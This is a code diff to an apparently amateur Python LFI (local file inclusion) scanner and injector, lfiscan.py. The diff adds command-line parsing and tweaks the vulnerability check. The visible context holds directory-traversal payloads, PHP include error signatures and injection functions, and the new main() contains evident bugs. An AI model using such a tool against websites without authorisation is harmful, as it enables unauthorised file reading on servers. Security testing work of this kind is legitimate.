@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import base64
+import argparse
 import getopt
 import os
 import re
@@ -10,7 +11,7 @@ import threading
 import requests
 
 from Crawler import Crawler
-
+from usage import usage
 
 payloads = {
     "../": "../",
@@ -30,16 +31,6 @@ errors = [
     "Warning: include()",
     "failed to open stream"    
 ]
-
-def usage():
-    print("Usage: ./lfiscan.py [option] [argument]")
-    print("Options:")
-    print("--url <url>            : URL of the website")
-    print("--scan                 : Crawl the website to search for vulnerable URLs")
-    print("--test                 : Tests an URL for LFI")
-    print("--inject [type] [opts] : Executes LFI Injection on vulnerable URL")
-    print("k,")
-
 
 def injectable(url):
     regex = re.compile('\?[a-zA-Z0-9]{1,}=')
@@ -81,14 +72,17 @@ def injectionTest(payload):
             for error in errors:
                 if error in r.text:
                     vuln = True
-            print("Website might be vulnerable.")
-            print("Try injecting with --inject [url] [ressource]\n")
+            if vuln:
+                print("Website might be vulnerable.")
+                print("Try injecting with --inject [url] [ressource]\n")
             return True
         elif r.status_code == 403:
             print("Website might be vulnerable: returned", r.status_code, "\n")
             return True
         elif r.status_code == 301 or r.status_code == 302:
             print("Website might be vulnerable: returned", r.status_code, "\n")
+            return True
+        else:
             return False
 
 def exploit(payload):
@@ -119,7 +113,58 @@ def inject(url, *argv):
         payload = craftPayload(url, argv[0], argv[1])
         exploit(payload)
 
+def main():
+    try:
+        opts, args = getopt.getopt(sys.argv[1:], "husti", ["help",
+                                                           "url",
+                                                           "scan",
+                                                           "test",
+                                                           "inject"])
+    except getopt.GetoptError as err:
+        print(err)
+        usage()
+        sys.exit(2)
+    url = None
+    scan = False
+    test = False
+    inject = False
+    injectdict = {
+        "type"     : None,
+        "resource" : None
+    }
+    for o, a in opts:
+        if o in ("-h", "--help"):
+            usage = True
+        elif o in ("-u", "--url"):
+            url = a
+        elif o in ("-s", "--scan"):
+            scan = True
+        elif o in ("-t", "--test"):
+            test = True
+        elif o in ("-i", "--inject"):
+            inject = True
+            injectdict["type"] = a[0]
+            injectdict["resource"] = a[1]
+    
+    if usage:
+        usage() 
+    elif type(url) is str:
+        if scan:
+            test = False
+            inject = False
+        elif test:
+            inject = False
+        elif inject:
+            valid = True
+            for key in injectdict:
+                if injectdict[key] == None:
+                    valid = False
+            if not valid:
+                inject = False
+    
+    else:
+        print("Error. You have to enter a url.")
+        usage()
 
-if __name__ == '__main__': #NOTE: THIS IS ONLY FOR TESTING, WILL SOON USE GETOPT
-    pass
-        
+if __name__ == '__main__':
+    main()
